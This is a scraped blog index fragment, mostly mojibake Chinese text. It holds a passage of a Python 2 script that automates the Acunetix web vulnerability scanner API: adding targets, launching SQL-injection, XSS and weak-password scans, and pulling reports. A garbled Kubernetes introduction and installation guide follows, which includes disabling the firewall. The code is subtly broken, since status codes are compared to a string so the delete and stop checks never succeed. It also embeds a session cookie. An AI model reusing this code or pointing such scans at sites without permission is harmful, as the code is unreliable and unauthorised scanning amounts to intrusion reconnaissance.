æ·»åŠ ä»»åŠ¡è·å–target_id # å¼€å§‹æ‰«æ &#39;&#39;&#39; 11111111-1111-1111-1111-111111111112 High Risk Vulnerabilities 11111111-1111-1111-1111-111111111115 Weak Passwords 11111111-1111-1111-1111-111111111117 Crawl Only 11111111-1111-1111-1111-111111111116 Cross-site Scripting Vulnerabilities 11111111-1111-1111-1111-111111111113 SQL Injection Vulnerabilities 11111111-1111-1111-1111-111111111118 quick_profile_2 0 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_quick&quot;}} 11111111-1111-1111-1111-111111111114 quick_profile_1 0 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_full&quot;}} 11111111-1111-1111-1111-111111111111 Full Scan 1 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;Default&quot;}} &#39;&#39;&#39; targets = getscan() if url in targets: return &quot;repeat&quot; else: target_id = addtask(url) data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}} try: response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return def getstatus(scan_id): # è·å–scan_idçš„æ‰«æçŠ¶å†µ try: response = requests.get(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) result = json.loads(response.content) status = result[&#39;current_session&#39;][&#39;status&#39;] # å¦‚æœæ˜¯completed è¡¨ç¤ºç»“æŸ.å¯ä»¥ç”ŸæˆæŠ¥å‘Š if status == &quot;completed&quot;: return getreports(scan_id) else: return result[&#39;current_session&#39;][&#39;status&#39;] except Exception as e: print(str(e)) return def delete_scan(scan_id): # åˆ é™¤scan_idçš„æ‰«æ try: response = requests.delete(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) # å¦‚æœæ˜¯204 è¡¨ç¤ºåˆ é™¤æˆåŠŸ if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def delete_target(scan_id): # åˆ é™¤scan_idçš„æ‰«æ try: response = requests.delete(tarurl + &quot;/api/v1/targets/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) # å¦‚æœæ˜¯204 è¡¨ç¤ºåˆ é™¤æˆåŠŸ if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def stop_scan(scan_id): # åœæ­¢scan_idçš„æ‰«æ try: response = requests.post(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id + &quot;/abort&quot;), headers=headers, timeout=30, verify=False) # å¦‚æœæ˜¯204 è¡¨ç¤ºåœæ­¢æˆåŠŸ if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def scan_status(): # åœæ­¢scan_idçš„æ‰«æ try: response = requests.get(tarurl + &quot;/api/v1/me/stats&quot;, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return def getreports(scan_id): # è·å–scan_idçš„æ‰«ææŠ¥å‘Š &#39;&#39;&#39; 11111111-1111-1111-1111-111111111111 Developer 21111111-1111-1111-1111-111111111111 XML 11111111-1111-1111-1111-111111111119 OWASP Top 10 2013 11111111-1111-1111-1111-111111111112 Quick &#39;&#39;&#39; data = {&quot;template_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;source&quot;: {&quot;list_type&quot;: &quot;scans&quot;, &quot;id_list&quot;: [scan_id]}} try: response = requests.post(tarurl + &quot;/api/v1/reports&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = response.headers report = result[&#39;Location&#39;].replace(&#39;/api/v1/reports/&#39;, &#39;/reports/download/&#39;) return tarurl.rstrip(&#39;/&#39;) + report except Exception as e: print(str(e)) return finally: delete_scan(scan_id) def config(url): target_id = addtask(url) # è·å–å…¨éƒ¨çš„æ‰«æçŠ¶æ€ data = { &quot;excluded_paths&quot;: [&quot;manager&quot;, &quot;phpmyadmin&quot;, &quot;testphp&quot;], &quot;user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;, &quot;custom_headers&quot;: [&quot;Accept: */*&quot;, &quot;Referer:&quot; + url, &quot;Connection: Keep-alive&quot;], &quot;custom_cookies&quot;: [{&quot;url&quot;: url, &quot;cookie&quot;: &quot;UM_distinctid=15da1bb9287f05-022f43184eb5d5-30667808-fa000-15da1bb9288ba9; PHPSESSID=dj9vq5fso96hpbgkdd7ok9gc83&quot;}], &quot;scan_speed&quot;: &quot;moderate&quot;, # sequential/slow/moderate/fast more and more fast &quot;technologies&quot;: [&quot;PHP&quot;], # ASP,ASP.NET,PHP,Perl,Java/J2EE,ColdFusion/Jrun,Python,Rails,FrontPage,Node.js # ä»£ç† &quot;proxy&quot;: { &quot;enabled&quot;: False, &quot;address&quot;: &quot;127.0.0.1&quot;, &quot;protocol&quot;: &quot;http&quot;, &quot;port&quot;: 8080, &quot;username&quot;: &quot;aaa&quot;, &quot;password&quot;: &quot;bbb&quot; }, # æ— éªŒè¯ç ç™»å½• &quot;login&quot;: { &quot;kind&quot;: &quot;automatic&quot;, &quot;credentials&quot;: { &quot;enabled&quot;: False, &quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; } }, # 401è®¤è¯ &quot;authentication&quot;: { &quot;enabled&quot;: False, &quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; } } try: res = requests.patch(tarurl + &quot;/api/v1/targets/&quot; + str(target_id) + &quot;/configuration&quot;, data=json.dumps(data), headers=headers, timeout=30 * 4, verify=False) data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}} try: response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return except Exception as e: raise e def getvulnerabilities(): # åœæ­¢scan_idçš„æ‰«æ try: response = requests.get(tarurl + &quot;/api/v1/vulnerabilities&quot;, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return def getscan(): # è·å–å…¨éƒ¨çš„æ‰«æçŠ¶æ€ targets = [] try: response = requests.get(tarurl + &quot;/api/v1/scans&quot;, headers=headers, timeout=30, verify=False) results = json.loads(response.content) return results except Exception as e: raise e def getvulnerabilitiesinfo(sid): # åœæ­¢scan_idçš„æ‰«æ try: response = requests.get(tarurl + &quot;/api/v1/vulnerabilities/&quot;+sid, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return if __name__ == &#39;__main__&#39;: info=getscan() print info print type(info) #print getreports(&#39;f22d4aa1-e2de-4307-bd9d-ddf3aa531bc1&#39;,locals()) # print config(&#39;http://testhtml5.vulnweb.com/&#39;)","categories":[{"name":"æ¼æ‰«","slug":"æ¼æ‰«","permalink":"http://yubenliu.cn/categories/æ¼æ‰«/"}],"tags":[{"name":"æ‰«æå™¨","slug":"æ‰«æå™¨","permalink":"http://yubenliu.cn/tags/æ‰«æå™¨/"},{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yubenliu.cn/tags/å·¥å…·/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yubenliu.cn/tags/è‡ªåŠ¨åŒ–/"}]},{"title":"kubernetesçš„éƒ¨ç½²","slug":"kubernetesçš„éƒ¨ç½²","date":"2019-08-01T06:20:00.000Z","updated":"2019-11-08T10:36:10.388Z","comments":true,"path":"2019/08/01/kubernetesçš„éƒ¨ç½²/","link":"","permalink":"http://yubenliu.cn/2019/08/01/kubernetesçš„éƒ¨ç½²/","excerpt":"ä»€ä¹ˆæ˜¯kubernetes Kubernetesæ˜¯Googleå¼€æºçš„å®¹å™¨é›†ç¾¤ç®¡ç†ç³»ç»Ÿï¼Œå…¶æä¾›åº”ç”¨éƒ¨ç½²ã€ç»´æŠ¤ã€ æ‰©å±•æœºåˆ¶ç­‰åŠŸèƒ½ï¼Œåˆ©ç”¨Kubernetesèƒ½æ–¹ä¾¿åœ°ç®¡ç†è·¨æœºå™¨è¿è¡Œå®¹å™¨åŒ–çš„åº”ç”¨","text":"ä»€ä¹ˆæ˜¯kubernetes Kubernetesæ˜¯Googleå¼€æºçš„å®¹å™¨é›†ç¾¤ç®¡ç†ç³»ç»Ÿï¼Œå…¶æä¾›åº”ç”¨éƒ¨ç½²ã€ç»´æŠ¤ã€ æ‰©å±•æœºåˆ¶ç­‰åŠŸèƒ½ï¼Œåˆ©ç”¨Kubernetesèƒ½æ–¹ä¾¿åœ°ç®¡ç†è·¨æœºå™¨è¿è¡Œå®¹å™¨åŒ–çš„åº”ç”¨ ##ä¸»è¦çš„åŠŸèƒ½1) ä½¿ç”¨Dockerå¯¹åº”ç”¨ç¨‹åºåŒ…è£…(package)ã€å®ä¾‹åŒ–(instantiate)ã€è¿è¡Œ(run)ã€‚ 2) ä»¥é›†ç¾¤çš„æ–¹å¼è¿è¡Œã€ç®¡ç†è·¨æœºå™¨çš„å®¹å™¨ã€‚ 3) è§£å†³Dockerè·¨æœºå™¨å®¹å™¨ä¹‹é—´çš„é€šè®¯é—®é¢˜ã€‚ 4) Kubernetesçš„è‡ªæˆ‘ä¿®å¤æœºåˆ¶ä½¿å¾—å®¹å™¨é›†ç¾¤æ€»æ˜¯è¿è¡Œåœ¨ç”¨æˆ·æœŸæœ›çš„çŠ¶æ€ã€‚ Kubernetesä¸»è¦æ¦‚å¿µä¸€ PodsPodæ˜¯Kubernetesçš„åŸºæœ¬æ“ä½œå•å…ƒï¼ŒæŠŠç›¸å…³çš„ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨æ„æˆä¸€ä¸ªPodï¼Œé€šå¸¸Podé‡Œçš„å®¹å™¨è¿è¡Œç›¸åŒçš„åº”ç”¨ã€‚PodåŒ…å«çš„å®¹å™¨è¿è¡Œåœ¨åŒä¸€ä¸ªMinion(Host)ä¸Šï¼Œçœ‹ä½œä¸€ä¸ªç»Ÿä¸€ç®¡ç†å•å…ƒï¼Œå…±äº«ç›¸åŒçš„volumeså’Œnetwork namespace/IPå’ŒPortç©ºé—´ã€‚ äºŒ ServicesServicesä¹Ÿæ˜¯Kubernetesçš„åŸºæœ¬æ“ä½œå•å…ƒï¼Œæ˜¯çœŸå®åº”ç”¨æœåŠ¡çš„æŠ½è±¡ï¼Œæ¯ä¸€ä¸ªæœåŠ¡åé¢éƒ½æœ‰å¾ˆå¤šå¯¹åº”çš„å®¹å™¨æ¥æ”¯æŒï¼Œé€šè¿‡Proxyçš„portå’ŒæœåŠ¡selectorå†³å®šæœåŠ¡è¯·æ±‚ä¼ é€’ç»™åç«¯æä¾›æœåŠ¡çš„å®¹å™¨ï¼Œå¯¹å¤–è¡¨ç°ä¸ºä¸€ä¸ªå•ä¸€è®¿é—®æ¥å£ï¼Œå¤–éƒ¨ä¸éœ€è¦äº†è§£åç«¯å¦‚ä½•è¿è¡Œï¼Œè¿™ç»™æ‰©å±•æˆ–ç»´æŠ¤åç«¯å¸¦æ¥å¾ˆå¤§çš„å¥½å¤„ã€‚ ä¸‰ Replication ControllersReplication Controllerç¡®ä¿ä»»ä½•æ—¶å€™Kubernetesé›†ç¾¤ä¸­æœ‰æŒ‡å®šæ•°é‡çš„podå‰¯æœ¬(replicas)åœ¨è¿è¡Œï¼Œ å¦‚æœå°‘äºæŒ‡å®šæ•°é‡çš„podå‰¯æœ¬(replicas)ï¼ŒReplication Controllerä¼šå¯åŠ¨æ–°çš„Containerï¼Œåä¹‹ä¼šæ€æ­»å¤šä½™çš„ä»¥ä¿è¯æ•°é‡ä¸å˜ã€‚Replication Controllerä½¿ç”¨é¢„å…ˆå®šä¹‰çš„podæ¨¡æ¿åˆ›å»ºpodsï¼Œä¸€æ—¦åˆ›å»ºæˆåŠŸï¼Œpod æ¨¡æ¿å’Œåˆ›å»ºçš„podsæ²¡æœ‰ä»»ä½•å…³è”ï¼Œå¯ä»¥ä¿®æ”¹pod æ¨¡æ¿è€Œä¸ä¼šå¯¹å·²åˆ›å»ºpodsæœ‰ä»»ä½•å½±å“ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ›´æ–°é€šè¿‡Replication Controlleråˆ›å»ºçš„podsã€‚å¯¹äºåˆ©ç”¨pod æ¨¡æ¿åˆ›å»ºçš„podsï¼ŒReplication Controlleræ ¹æ®label selectoræ¥å…³è”ï¼Œé€šè¿‡ä¿®æ”¹podsçš„labelå¯ä»¥åˆ é™¤å¯¹åº”çš„podsã€‚Replication Controllerä¸»è¦æœ‰å¦‚ä¸‹ç”¨æ³•ï¼š1) Reschedulingå¦‚ä¸Šæ‰€è¿°ï¼ŒReplication Controllerä¼šç¡®ä¿Kubernetesé›†ç¾¤ä¸­æŒ‡å®šçš„podå‰¯æœ¬(replicas)åœ¨è¿è¡Œï¼Œ å³ä½¿åœ¨èŠ‚ç‚¹å‡ºé”™æ—¶ã€‚2) Scalingé€šè¿‡ä¿®æ”¹Replication Controllerçš„å‰¯æœ¬(replicas)æ•°é‡æ¥æ°´å¹³æ‰©å±•æˆ–è€…ç¼©å°è¿è¡Œçš„podsã€‚3) Rolling updatesReplication Controllerçš„è®¾è®¡åŸåˆ™ä½¿å¾—å¯ä»¥ä¸€ä¸ªä¸€ä¸ªåœ°æ›¿æ¢podsæ¥rolling updatesæœåŠ¡ã€‚4) Multiple release trackså¦‚æœéœ€è¦åœ¨ç³»ç»Ÿä¸­è¿è¡Œmultiple releaseçš„æœåŠ¡ï¼ŒReplication Controllerä½¿ç”¨labelsæ¥åŒºåˆ†multiple release tracksã€‚ å›› LabelsLabelsæ˜¯ç”¨äºåŒºåˆ†Podã€Serviceã€Replication Controllerçš„key/valueé”®å€¼å¯¹ï¼ŒPodã€Serviceã€ Replication Controllerå¯ä»¥æœ‰å¤šä¸ªlabelï¼Œä½†æ˜¯æ¯ä¸ªlabelçš„keyåªèƒ½å¯¹åº”ä¸€ä¸ªvalueã€‚Labelsæ˜¯Serviceå’ŒReplication Controllerè¿è¡Œçš„åŸºç¡€ï¼Œä¸ºäº†å°†è®¿é—®Serviceçš„è¯·æ±‚è½¬å‘ç»™åç«¯æä¾›æœåŠ¡çš„å¤šä¸ªå®¹å™¨ï¼Œæ­£æ˜¯é€šè¿‡æ ‡è¯†å®¹å™¨çš„labelsæ¥é€‰æ‹©æ­£ç¡®çš„å®¹å™¨ã€‚åŒæ ·ï¼ŒReplication Controllerä¹Ÿä½¿ç”¨labelsæ¥ç®¡ç†é€šè¿‡pod æ¨¡æ¿åˆ›å»ºçš„ä¸€ç»„å®¹å™¨ï¼Œè¿™æ ·Replication Controllerå¯ä»¥æ›´åŠ å®¹æ˜“ï¼Œæ–¹ä¾¿åœ°ç®¡ç†å¤šä¸ªå®¹å™¨ï¼Œæ— è®ºæœ‰å¤šå°‘å®¹å™¨ã€‚ Kubernetesæ„ä»¶Kubenetesæ•´ä½“æ¡†æ¶ï¼Œä¸»è¦åŒ…æ‹¬kubecfgã€Master API Serverã€Kubeletã€Minion(Host)ä»¥åŠProxy ä¸€ MasterMasterå®šä¹‰äº†Kubernetes é›†ç¾¤Master/API Serverçš„ä¸»è¦å£°æ˜ï¼ŒåŒ…æ‹¬Pod Registryã€Controller Registryã€Service Registryã€Endpoint Registryã€Minion Registryã€Binding Registryã€RESTStorageä»¥åŠClient, æ˜¯client(Kubecfg)è°ƒç”¨Kubernetes APIï¼Œç®¡ç†Kubernetesä¸»è¦æ„ä»¶Podsã€Servicesã€Minionsã€å®¹å™¨çš„å…¥å£ã€‚Masterç”±API Serverã€Schedulerä»¥åŠRegistryç­‰ç»„æˆã€‚ä»ä¸‹å›¾å¯çŸ¥Masterçš„å·¥ä½œæµä¸»è¦åˆ†ä»¥ä¸‹æ­¥éª¤ï¼š1) Kubecfgå°†ç‰¹å®šçš„è¯·æ±‚ï¼Œæ¯”å¦‚åˆ›å»ºPodï¼Œå‘é€ç»™Kubernetes Clientã€‚2) Kubernetes Clientå°†è¯·æ±‚å‘é€ç»™API serverã€‚3) API Serveræ ¹æ®è¯·æ±‚çš„ç±»å‹ï¼Œæ¯”å¦‚åˆ›å»ºPodæ—¶storageç±»å‹æ˜¯podsï¼Œç„¶åä¾æ­¤é€‰æ‹©ä½•ç§REST Storage APIå¯¹è¯·æ±‚ä½œå‡ºå¤„ç†ã€‚4) REST Storage APIå¯¹çš„è¯·æ±‚ä½œç›¸åº”çš„å¤„ç†ã€‚5) å°†å¤„ç†çš„ç»“æœå­˜å…¥é«˜å¯ç”¨é”®å€¼å­˜å‚¨ç³»ç»ŸEtcdä¸­ã€‚6) åœ¨API Serverå“åº”Kubecfgçš„è¯·æ±‚åï¼ŒSchedulerä¼šæ ¹æ®Kubernetes Clientè·å–é›†ç¾¤ä¸­è¿è¡ŒPodåŠMinionä¿¡æ¯ã€‚7) ä¾æ®ä»Kubernetes Clientè·å–çš„ä¿¡æ¯ï¼ŒSchedulerå°†æœªåˆ†å‘çš„Podåˆ†å‘åˆ°å¯ç”¨çš„MinionèŠ‚ç‚¹ä¸Šã€‚ä¸‹é¢æ˜¯Masterçš„ä¸»è¦æ„ä»¶çš„è¯¦ç»†ä»‹ç»ï¼šå›¾3-2 Masterä¸»è¦æ„ä»¶åŠå·¥ä½œæµ Minion RegistryMinion Registryè´Ÿè´£è·Ÿè¸ªKubernetes é›†ç¾¤ä¸­æœ‰å¤šå°‘Minion(Host)ã€‚Kuberneteså°è£…Minion Registryæˆå®ç°Kubernetes API Serverçš„RESTful APIæ¥å£RESTï¼Œé€šè¿‡è¿™äº›APIï¼Œæˆ‘ä»¬å¯ä»¥å¯¹Minion RegistryåšCreateã€Getã€Listã€Deleteæ“ä½œï¼Œç”±äºMinonåªèƒ½è¢«åˆ›å»ºæˆ–åˆ é™¤ï¼Œæ‰€ä»¥ä¸æ”¯æŒUpdateæ“ä½œï¼Œå¹¶æŠŠMinionçš„ç›¸å…³é…ç½®ä¿¡æ¯å­˜å‚¨åˆ°etcdã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒSchedulerç®—æ³•æ ¹æ®Minionçš„èµ„æºå®¹é‡æ¥ç¡®å®šæ˜¯å¦å°†æ–°å»ºPodåˆ†å‘åˆ°è¯¥MinionèŠ‚ç‚¹ã€‚ Pod RegistryPod Registryè´Ÿè´£è·Ÿè¸ªKubernetesé›†ç¾¤ä¸­æœ‰å¤šå°‘Podåœ¨è¿è¡Œï¼Œä»¥åŠè¿™äº›Podè·ŸMinionæ˜¯å¦‚ä½•çš„æ˜ å°„å…³ç³»ã€‚å°†Pod Registryå’ŒCloud Providerä¿¡æ¯åŠå…¶ä»–ç›¸å…³ä¿¡æ¯å°è£…æˆå®ç°Kubernetes API Serverçš„RESTful APIæ¥å£RESTã€‚é€šè¿‡è¿™äº›APIï¼Œæˆ‘ä»¬å¯ä»¥å¯¹Podè¿›è¡ŒCreateã€Getã€Listã€Updateã€Deleteæ“ä½œï¼Œå¹¶å°†Podçš„ä¿¡æ¯å­˜å‚¨åˆ°etcdä¸­ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡Watchæ¥å£ç›‘è§†Podçš„å˜åŒ–æƒ…å†µï¼Œæ¯”å¦‚ä¸€ä¸ªPodè¢«æ–°å»ºã€åˆ é™¤æˆ–è€…æ›´æ–°ã€‚ Service RegistryService Registryè´Ÿè´£è·Ÿè¸ªKubernetesé›†ç¾¤ä¸­è¿è¡Œçš„æ‰€æœ‰æœåŠ¡ã€‚æ ¹æ®æä¾›çš„Cloud ProvideråŠMinion Registryä¿¡æ¯æŠŠService Registryå°è£…æˆå®ç°Kubernetes API Serveréœ€è¦çš„RESTful APIæ¥å£RESTã€‚åˆ©ç”¨è¿™äº›æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹Serviceè¿›è¡ŒCreateã€Getã€Listã€Updateã€Deleteæ“ä½œï¼Œä»¥åŠç›‘è§†Serviceå˜åŒ–æƒ…å†µçš„watchæ“ä½œï¼Œå¹¶æŠŠServiceä¿¡æ¯å­˜å‚¨åˆ°etcdã€‚ Controller RegistryController Registryè´Ÿè´£è·Ÿè¸ªKubernetesé›†ç¾¤ä¸­æ‰€æœ‰çš„Replication Controllerï¼ŒReplication Controllerç»´æŠ¤ç€æŒ‡å®šæ•°é‡çš„pod å‰¯æœ¬(replicas)æ‹·è´ï¼Œå¦‚æœå…¶ä¸­çš„ä¸€ä¸ªå®¹å™¨æ­»æ‰ï¼ŒReplication Controllerä¼šè‡ªåŠ¨å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå¦‚æœæ­»æ‰çš„å®¹å™¨æ¢å¤ï¼Œå…¶ä¼šæ€æ­»å¤šå‡ºçš„å®¹å™¨ä»¥ä¿è¯æŒ‡å®šçš„æ‹·è´ä¸å˜ã€‚é€šè¿‡å°è£…Controller Registryä¸ºå®ç°Kubernetes API Serverçš„RESTful APIæ¥å£RESTï¼Œ åˆ©ç”¨è¿™äº›æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹Replication Controllerè¿›è¡ŒCreateã€Getã€Listã€Updateã€Deleteæ“ä½œï¼Œä»¥åŠç›‘è§†Replication Controllerå˜åŒ–æƒ…å†µçš„watchæ“ä½œï¼Œå¹¶æŠŠReplication Controllerä¿¡æ¯å­˜å‚¨åˆ°etcdã€‚ Endpoints RegistryEndpoints Registryè´Ÿè´£æ”¶é›†Serviceçš„endpointï¼Œæ¯”å¦‚Nameï¼šâ€mysqlâ€ï¼ŒEndpoints: [â€œ10.10.1.1:1909â€ï¼Œâ€10.10.2.2:8834â€]ï¼ŒåŒPod Registryï¼ŒController Registryä¹Ÿå®ç°äº†Kubernetes API Serverçš„RESTful APIæ¥å£ï¼Œå¯ä»¥åšCreateã€Getã€Listã€Updateã€Deleteä»¥åŠwatchæ“ä½œã€‚ Binding RegistryBindingåŒ…æ‹¬ä¸€ä¸ªéœ€è¦ç»‘å®šPodçš„IDå’ŒPodè¢«ç»‘å®šçš„Hostï¼ŒSchedulerå†™Binding Registryåï¼Œéœ€ç»‘å®šçš„Podè¢«ç»‘å®šåˆ°ä¸€ä¸ªhostã€‚Binding Registryä¹Ÿå®ç°äº†Kubernetes API Serverçš„RESTful APIæ¥å£ï¼Œä½†Binding Registryæ˜¯ä¸€ä¸ªwrite-onlyå¯¹è±¡ï¼Œæ‰€æœ‰åªæœ‰Createæ“ä½œå¯ä»¥ä½¿ç”¨ï¼Œ å¦åˆ™ä¼šå¼•èµ·é”™è¯¯ã€‚ SchedulerScheduleræ”¶é›†å’Œåˆ†æå½“å‰Kubernetesé›†ç¾¤ä¸­æ‰€æœ‰MinionèŠ‚ç‚¹çš„èµ„æº(å†…å­˜ã€CPU)è´Ÿè½½æƒ…å†µï¼Œç„¶åä¾æ­¤åˆ†å‘æ–°å»ºçš„Podåˆ°Kubernetesé›†ç¾¤ä¸­å¯ç”¨çš„èŠ‚ç‚¹ã€‚ç”±äºä¸€æ—¦MinionèŠ‚ç‚¹çš„èµ„æºè¢«åˆ†é…ç»™Podï¼Œé‚£è¿™äº›èµ„æºå°±ä¸èƒ½å†åˆ†é…ç»™å…¶ä»–Podï¼Œ é™¤éè¿™äº›Podè¢«åˆ é™¤æˆ–è€…é€€å‡ºï¼Œ å› æ­¤ï¼ŒKuberneteséœ€è¦åˆ†æé›†ç¾¤ä¸­æ‰€æœ‰Minionçš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œä¿è¯åˆ†å‘çš„å·¥ä½œè´Ÿè½½ä¸ä¼šè¶…å‡ºå½“å‰è¯¥MinionèŠ‚ç‚¹çš„å¯ç”¨èµ„æºèŒƒå›´ã€‚å…·ä½“æ¥è¯´ï¼ŒScheduleråšä»¥ä¸‹å·¥ä½œï¼š1) å®æ—¶ç›‘æµ‹Kubernetesé›†ç¾¤ä¸­æœªåˆ†å‘çš„Podã€‚2) å®æ—¶ç›‘æµ‹Kubernetesé›†ç¾¤ä¸­æ‰€æœ‰è¿è¡Œçš„Podï¼ŒScheduleréœ€è¦æ ¹æ®è¿™äº›Podçš„èµ„æºçŠ¶å†µå®‰å…¨åœ°å°†æœªåˆ†å‘çš„Podåˆ†å‘åˆ°æŒ‡å®šçš„MinionèŠ‚ç‚¹ä¸Šã€‚3) Schedulerä¹Ÿç›‘æµ‹MinionèŠ‚ç‚¹ä¿¡æ¯ï¼Œç”±äºä¼šé¢‘ç¹æŸ¥æ‰¾MinionèŠ‚ç‚¹ï¼ŒSchedulerä¼šç¼“å­˜ä¸€ä»½æœ€æ–°çš„ä¿¡æ¯åœ¨æœ¬åœ°ã€‚4) æœ€åï¼ŒScheduleråœ¨åˆ†å‘Podåˆ°æŒ‡å®šçš„MinionèŠ‚ç‚¹åï¼Œä¼šæŠŠPodç›¸å…³çš„ä¿¡æ¯Bindingå†™å›API Serverã€‚ Kubeletå›¾3-3 Kubernetesè¯¦ç»†æ„ä»¶æ ¹æ®ä¸Šå›¾3-3å¯çŸ¥Kubeletæ˜¯Kubernetesé›†ç¾¤ä¸­æ¯ä¸ªMinionå’ŒMaster API Serverçš„è¿æ¥ç‚¹ï¼ŒKubeletè¿è¡Œåœ¨æ¯ä¸ªMinionä¸Šï¼Œæ˜¯Master API Serverå’ŒMinionä¹‹é—´çš„æ¡¥æ¢ï¼Œæ¥æ”¶Master API Serveråˆ†é…ç»™å®ƒçš„commandså’Œworkï¼Œä¸æŒä¹…æ€§é”®å€¼å­˜å‚¨etcdã€fileã€serverå’Œhttpè¿›è¡Œäº¤äº’ï¼Œè¯»å–é…ç½®ä¿¡æ¯ã€‚Kubeletçš„ä¸»è¦å·¥ä½œæ˜¯ç®¡ç†Podå’Œå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼Œå…¶åŒ…æ‹¬Docker Clientã€Root Directoryã€Pod Workersã€Etcd Clientã€Cadvisor Clientä»¥åŠHealth Checkerç»„ä»¶ï¼Œå…·ä½“å·¥ä½œå¦‚ä¸‹ï¼š1) é€šè¿‡Workerç»™Podå¼‚æ­¥è¿è¡Œç‰¹å®šçš„Actionã€‚2) è®¾ç½®å®¹å™¨çš„ç¯å¢ƒå˜é‡ã€‚3) ç»™å®¹å™¨ç»‘å®šVolumeã€‚4) ç»™å®¹å™¨ç»‘å®šPortã€‚5) æ ¹æ®æŒ‡å®šçš„Podè¿è¡Œä¸€ä¸ªå•ä¸€å®¹å™¨ã€‚6) æ€æ­»å®¹å™¨ã€‚7) ç»™æŒ‡å®šçš„Podåˆ›å»ºnetwork å®¹å™¨ã€‚8) åˆ é™¤Podçš„æ‰€æœ‰å®¹å™¨ã€‚9) åŒæ­¥Podçš„çŠ¶æ€ã€‚10) ä»Cadvisorè·å–container infoã€ pod infoã€root infoã€machine infoã€‚11) æ£€æµ‹Podçš„å®¹å™¨å¥åº·çŠ¶æ€ä¿¡æ¯ã€‚12) åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ã€‚ ProxyProxyæ˜¯ä¸ºäº†è§£å†³å¤–éƒ¨ç½‘ç»œèƒ½å¤Ÿè®¿é—®è·¨æœºå™¨é›†ç¾¤ä¸­å®¹å™¨æä¾›çš„åº”ç”¨æœåŠ¡è€Œè®¾è®¡çš„ï¼Œä»ä¸Šå›¾3-3å¯çŸ¥ProxyæœåŠ¡ä¹Ÿè¿è¡Œåœ¨æ¯ä¸ªMinionä¸Šã€‚Proxyæä¾›TCP/UDP socketsçš„proxyï¼Œæ¯åˆ›å»ºä¸€ç§Serviceï¼ŒProxyä¸»è¦ä»etcdè·å–Serviceså’ŒEndpointsçš„é…ç½®ä¿¡æ¯ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä»fileè·å–ï¼Œç„¶åæ ¹æ®é…ç½®ä¿¡æ¯åœ¨Minionä¸Šå¯åŠ¨ä¸€ä¸ªProxyçš„è¿›ç¨‹å¹¶ç›‘å¬ç›¸åº”çš„æœåŠ¡ç«¯å£ï¼Œå½“å¤–éƒ¨è¯·æ±‚å‘ç”Ÿæ—¶ï¼ŒProxyä¼šæ ¹æ®Load Balancerå°†è¯·æ±‚åˆ†å‘åˆ°åç«¯æ­£ç¡®çš„å®¹å™¨å¤„ å®‰è£…ä½¿ç”¨ å‡†å¤‡å·¥ä½œ å¯¹è±¡ ç‰ˆæœ¬ ip å¤‡æ³¨ k8s-master centos7 192.168.29.11 K8Sçš„masteræ‰€åœ¨ä¸»æœº etcd-server centos7 192.168.29.11 etcdæœåŠ¡æ‰€åœ¨ä¸»æœºï¼Œä¸masteråœ¨åŒä¸€æœºå™¨ k8s-slave centos7 192.168.29.12 K8SèŠ‚ç‚¹æ‰€åœ¨ä¸»æœº å®‰è£…ä¸»è¦ç¨‹åº 192.168.29.11æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£…kuberneteså’Œetcd yum -y install --enablerepo=virt7-docker-common-release kubernetes etcd ç¦ç”¨é˜²ç«å¢™systemctl disable iptables-services firewalld systemctl stop iptables-services firewalld 192.168.29.11 ä¸Šä¸»æœºé…ç½®ä¸€ 